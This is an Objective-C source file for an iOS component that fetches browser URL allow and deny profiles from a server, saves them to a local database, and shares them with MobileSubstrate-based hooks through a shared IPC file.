//
//  UrlProfileManagerImpl.m
//  UrlProfileManager
//
//  Created by Makara Khloth on 7/9/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "UrlProfileManagerImpl.h"
#import "UrlProfileDelegate.h"
#import "UrlProfileDatabase.h"
#import "UrlProfileDAO.h"
#import "UrlsPolicyProfile.h"
#import "UrlsProfile.h"
#import "DataDelivery.h"
#import "DeliveryRequest.h"
#import "GetUrlProfile.h"
#import "DeliveryResponse.h"
#import "GetUrlProfileResponse.h"
#import "ResponseUrlProfileProvider.h"
#import "UrlProfile.h"
#import "UrlProfileInfo.h"
#import "SharedFileIPC.h"
#import "DefStd.h"

@interface UrlProfileManagerImpl (private)
- (BOOL) sendUrlProfile;
- (BOOL) getUrlProfile;
- (DeliveryRequest *) sendUrlProfileRequest;
- (DeliveryRequest *) getUrlProfileRequest;

- (void) processServerReponseSuccess: (DeliveryResponse *) aResponse;
@end

@implementation UrlProfileManagerImpl

- (id) initWithDDM: (id <DataDelivery>) aDDM {
	if ((self = [super init])) {
		mDDM = aDDM;
		mAppProfileDatabase = [[UrlProfileDatabase alloc] initOpenWithDatabaseFileName:@"urlsprofile.db"];
		if ([mDDM isRequestPendingForCaller:kDDC_UrlsProfileManager]) {
			[mDDM registerCaller:kDDC_UrlsProfileManager withListener:self];
		}
	}
	return (self);
}

- (void) start {
	BOOL On = YES;
	SharedFileIPC *sFile = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate3];
	[sFile writeData:[NSData dataWithBytes:&On length:sizeof(BOOL)] withID:kSharedFileIsUrlProfileEnableID];
	[sFile release];
}

- (void) stop {
	BOOL Off = NO;
	SharedFileIPC *sFile = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate3];
	[sFile writeData:[NSData dataWithBytes:&Off length:sizeof(BOOL)] withID:kSharedFileIsUrlProfileEnableID];
	[sFile release];
	
	[NSObject cancelPreviousPerformRequestsWithTarget:self
											 selector:@selector(deliverUrlProfile:)
											   object:nil];
	[NSObject cancelPreviousPerformRequestsWithTarget:self
											 selector:@selector(syncUrlProfile:)
											   object:nil];
}

- (void) clearUrlProfile {
	UrlProfileDAO *dao = [[UrlProfileDAO alloc] initWithDatabase:[mAppProfileDatabase mDatabase]];
	[dao clear];
	[dao release];
}

- (BOOL) deliverUrlProfile: (id <UrlProfileDelegate>) aDelegate {
	BOOL success = [self sendUrlProfile];
	if (success) mDeliverUrlProfileDelegate = aDelegate;
	return (success);
}

- (BOOL) syncUrlProfile: (id <UrlProfileDelegate>) aDelegate {
	DLog (@">>>>>>>> syncUrlProfile")
	BOOL success = [self getUrlProfile];
	if (success) mSyncUrlProfileDelegate = aDelegate;
	return (success);
}

- (void) requestFinished: (DeliveryResponse*) aResponse {
	DLog (@">>>>>>> requestFinish")
	id <UrlProfileDelegate> delegate = nil;
	if ([aResponse mEDPType] == kEDPTypeSendUrlProfile) {
		DLog (@">>>>>>> kEDPTypeSendUrlProfile")
		delegate = mDeliverUrlProfileDelegate;
		mDeliverUrlProfileDelegate = nil;
		if ([delegate respondsToSelector:@selector(deliverUrlProfileDidFinished:)]) {
			if ([aResponse mSuccess]) {
				[delegate performSelector:@selector(deliverUrlProfileDidFinished:) withObject:nil];
			} else {
				NSError *error = [NSError errorWithDomain:@"Send urls profiles" code:[aResponse mStatusCode] userInfo:nil];
				[delegate performSelector:@selector(deliverUrlProfileDidFinished:) withObject:error];
				
				// Requirement: retry every one minute if fail
				[self performSelector:@selector(deliverUrlProfile:)
						   withObject:nil
						   afterDelay:60];
			}
		}
	} else if ([aResponse mEDPType] == kEDPTypeGetUrlProfile) {
		DLog (@">>>>>>> kEDPTypeGetUrlProfile")
		delegate = mSyncUrlProfileDelegate;
		mSyncUrlProfileDelegate = nil;
		if ([delegate respondsToSelector:@selector(syncUrlProfileDidFinished:)]) {
			if ([aResponse mSuccess]) {
				[self processServerReponseSuccess:aResponse];
				[delegate performSelector:@selector(syncUrlProfileDidFinished:) withObject:nil];
			} else {
				NSError *error = [NSError errorWithDomain:@"Get urls profiles" code:[aResponse mStatusCode] userInfo:nil];
				[delegate performSelector:@selector(syncUrlProfileDidFinished:) withObject:error];
				
				// Requirement: retry every one minute if fail
				[self performSelector:@selector(syncUrlProfile:)
						   withObject:nil
						   afterDelay:60];
			}
		}
	}
}

- (void) updateRequestProgress: (DeliveryResponse*) aResponse {
	// NOTHING
}

- (BOOL) sendUrlProfile {
	BOOL success = NO;
	DeliveryRequest* request = [self sendUrlProfileRequest];
	if (![mDDM isRequestIsPending:request]) {
		// TODO: Implement later $$$
//		GetUrlProfile* getUrlProfile = [[GetUrlProfile alloc] init];
//		[request setMCommandCode:[getUrlProfile getCommand]];
//		[request setMCompressionFlag:1];
//		[request setMEncryptionFlag:1];
//		[request setMCommandData:getUrlProfile];
//		[request setMDeliveryListener:self];
//		[mDDM deliver:request];
//		[getUrlProfile release];
//		success = YES;
	}
	return (success);
}

- (BOOL) getUrlProfile {
	BOOL success = NO;
	DeliveryRequest* request = [self getUrlProfileRequest];
	if (![mDDM isRequestIsPending:request]) {
		GetUrlProfile* getUrlProfile = [[GetUrlProfile alloc] init];
		[request setMCommandCode:[getUrlProfile getCommand]];
		[request setMCompressionFlag:1];
		[request setMEncryptionFlag:1];
		[request setMCommandData:getUrlProfile];
		[request setMDeliveryListener:self];
		[mDDM deliver:request];
		[getUrlProfile release];
		success = YES;
	}
	return (success);
}

- (DeliveryRequest *) sendUrlProfileRequest {
	DeliveryRequest* request = [[DeliveryRequest alloc] init];
    [request setMCallerId:kDDC_UrlsProfileManager];
    [request setMPriority:kDDMRequestPriortyNormal];
    [request setMMaxRetry:3];
    [request setMEDPType:kEDPTypeSendUrlProfile];
    [request setMRetryTimeout:60];
    [request setMConnectionTimeout:60];
	[request autorelease];
	return (request);
}

- (DeliveryRequest *) getUrlProfileRequest {
	DeliveryRequest* request = [[DeliveryRequest alloc] init];
    [request setMCallerId:kDDC_UrlsProfileManager];
    [request setMPriority:kDDMRequestPriortyNormal];
    [request setMMaxRetry:3];
    [request setMEDPType:kEDPTypeGetUrlProfile];
    [request setMRetryTimeout:60];
    [request setMConnectionTimeout:60];
	[request autorelease];
	return (request);
}

- (void) processServerReponseSuccess: (DeliveryResponse *) aResponse {
	UrlProfileDAO *dao = [[UrlProfileDAO alloc] initWithDatabase:[mAppProfileDatabase mDatabase]];
	[dao clear];
	
	GetUrlProfileResponse *response = (GetUrlProfileResponse *)[aResponse mCSMReponse];
	UrlProfile *urlProfile = [response mUrlProfile];
	DLog (@"UrlsProfile (0 allow/1 disallow): %@", urlProfile)
	
	UrlsPolicyProfile *policyProfile = [[UrlsPolicyProfile alloc] init];
	[policyProfile setMDBID:0];
	[policyProfile setMPolicy:[urlProfile mPolicy]];
	[policyProfile setMProfileName:[urlProfile mProfileName]];
	[dao insertPolicyProfile:policyProfile];
	[policyProfile release];
	
	ResponseUrlProfileProvider *provider = [urlProfile mAllowUrlsProvider];
	while ([provider hasNext]) {
		UrlProfileInfo *urlProfileInfo = [provider getObject];
		UrlsProfile *urlsProfile = [[UrlsProfile alloc] init];
		[urlsProfile setMDBID:0];
		[urlsProfile setMUrl:[urlProfileInfo mUrl]];
		[urlsProfile setMBrowser:[urlProfileInfo mBrowser]];
		[urlsProfile setMAllow:YES];
		DLog (@"Allowed UrlsProfile: %@", urlsProfile)
		[dao insertUrlsProfile:urlsProfile];
		[urlsProfile release];
	}
	
	provider = [urlProfile mDisAllowUrlsProvider];
	while ([provider hasNext]) {
		UrlProfileInfo *urlProfileInfo = [provider getObject];
		UrlsProfile *urlsProfile = [[UrlsProfile alloc] init];
		[urlsProfile setMDBID:0];
		[urlsProfile setMUrl:[urlProfileInfo mUrl]];
		[urlsProfile setMBrowser:[urlProfileInfo mBrowser]];
		[urlsProfile setMAllow:NO];
		DLog (@"DisAllowed UrlsProfile: %@", urlsProfile)
		[dao insertUrlsProfile:urlsProfile];
		[urlsProfile release];
	}

	// Save to share ipc file
	NSMutableData *urlPolicyProfileData = [NSMutableData data];
	NSArray *urlPolicyProfiles = [dao selectPolicyProfiles];
	DLog (@"urlPolicyProfiles: %@", urlPolicyProfiles)
	
	NSInteger count = [urlPolicyProfiles count];
	[urlPolicyProfileData appendBytes:&count length:sizeof(NSInteger)];		// 4 bytes
	
	for (UrlsPolicyProfile *policyProfile in urlPolicyProfiles) {
		NSInteger length = [[policyProfile toData] length];
		[urlPolicyProfileData appendBytes:&length length:sizeof(NSInteger)];
		[urlPolicyProfileData appendData:[policyProfile toData]];
	}
	
	NSMutableData *urlsProfileData = [NSMutableData data];
	NSArray *urlsProfiles = [dao selectUrlsProfiles];
	count = [urlsProfiles count];
	[urlsProfileData appendBytes:&count length:sizeof(NSInteger)];
	for (UrlsProfile *urlsProfile in urlsProfiles) {
		NSInteger length = [[urlsProfile toData] length];
		[urlsProfileData appendBytes:&length length:sizeof(NSInteger)];
		[urlsProfileData appendData:[urlsProfile toData]];
	}

	SharedFileIPC *sFile = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate3];
	[sFile writeData:urlPolicyProfileData 
			  withID:kSharedFileUrlPolicyProfileID];		// policy
	[sFile writeData:urlsProfileData  
			  withID:kSharedFileUrlsProfileID];				// urls
	[sFile release];
	
	[dao release];
}

- (void) dealloc {
	[mAppProfileDatabase release];
	[super dealloc];
}

@end
